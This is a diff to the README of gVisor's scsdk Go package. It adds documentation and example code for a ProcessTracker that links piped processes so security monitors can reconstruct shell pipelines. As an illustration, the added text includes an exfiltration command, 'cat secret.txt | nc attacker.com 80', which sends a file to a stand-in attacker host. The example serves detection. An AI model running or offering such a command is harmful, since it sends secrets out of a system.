@@ -31,7 +31,7 @@ defer c.Close()
 If you already have a `*urpc.Client`, you can wrap it into a `*SandboxClient` by
 using `scsdk.NewSandboxClient(conn)`.
 
-## Reading Files (Fs.Read equivalent)
+## Use Case 1: Reading Files (Fs.Read equivalent)
 
 This command emulates `runsc read` but is much faster since it avoids the
 overhead of spawning a new process. It is capable of fetching the contents of a
@@ -90,4 +90,65 @@ data, err := scsdk.ReadFile("/var/run/runsc/<sandbox-id>/control", scsdk.ReadOpt
 err = scsdk.ReadFileToWriter("/var/run/runsc/<sandbox-id>/control", scsdk.ReadOptions{
     Path: "/proc/version",
 }, os.Stdout)
+```
+
+## Use Case 2: Tracking Shell Pipelines
+
+The `scsdk.ProcessTracker` can be used by a trace consumer to track historical
+process metadata (PID, start time, binary path, argv, and env) and automatically
+enrich events with sibling process information when processes are connected via
+stdin or stdout pipes.
+
+For example, when users execute shell pipelines inside the container (e.g., `cat
+secret.txt | nc attacker.com 80`), the kernel registers these as two entirely
+independent process executions. By maintaining historical process state, the
+`ProcessTracker` analyzes the file descriptors and automatically correlates that
+the `nc` process is receiving its `stdin` pipe directly from `cat`'s `stdout`.
+This allows security monitoring daemons to reconstruct the pipeline and identify
+events that would otherwise appear disjointed or unrelated.
+
+Note: The `ProcessTracker` is entirely decoupled from the RPC connection and
+does not communicate directly with the sandbox. It is an offline state machine.
+Users must independently receive the raw protobuf messages (e.g., from a sink
+like the remote HTTP endpoints or Unix sockets) and explicitly feed them into
+`ProcessExecve` and `ProcessTaskExit` to maintain the tracking state.
+
+**Important:** A cached process will only be removed from the internal tracker
+upon receiving a `TaskExit` event. If your sink config filters out task exit
+events, or if you fail to feed them to the tracker, the internal cache will grow
+indefinitely and cause a memory leak.
+
+### Usage
+
+```go
+import "gvisor.dev/gvisor/pkg/seccheck/scsdk"
+
+// Initialize a ProcessTracker in your monitoring daemon:
+pt := scsdk.NewProcessTracker()
+
+// Whenever a protobuf message arrives from the source (e.g. Unix socket, gRPC, file):
+switch msg := protoMsg.(type) {
+case *pb.ExecveInfo:
+    // Map the raw protobuf to a SDK event:
+    execEvent := scsdk.ToExecutionEvent(msg)
+
+    // ProcessExecve updates the tracker table and returns an EnrichedExecveEvent
+    // where PipeInputSibling and PipeOutputSibling are automatically resolved.
+    enriched := pt.ProcessExecve(execEvent)
+    fmt.Printf("Process executed: %s (PID %d, Argv: %v)\n",
+        enriched.Process.BinaryPath, enriched.Process.Key.ThreadGroupID, enriched.Process.Argv)
+
+    if sib := enriched.PipeInputSibling; sib != nil {
+        fmt.Printf("  <- Piped input from sibling: %s (PID %d, Argv: %v)\n",
+            sib.BinaryPath, sib.Key.ThreadGroupID, sib.Argv)
+    }
+    if sib := enriched.PipeOutputSibling; sib != nil {
+        fmt.Printf("  -> Piped output to sibling: %s (PID %d, Argv: %v)\n",
+            sib.BinaryPath, sib.Key.ThreadGroupID, sib.Argv)
+    }
+
+case *pb.TaskExit:
+    // ProcessTaskExit cleans up tracked state when a thread group exits.
+    pt.ProcessTaskExit(scsdk.ToTaskExitEvent(msg))
+}
 ```
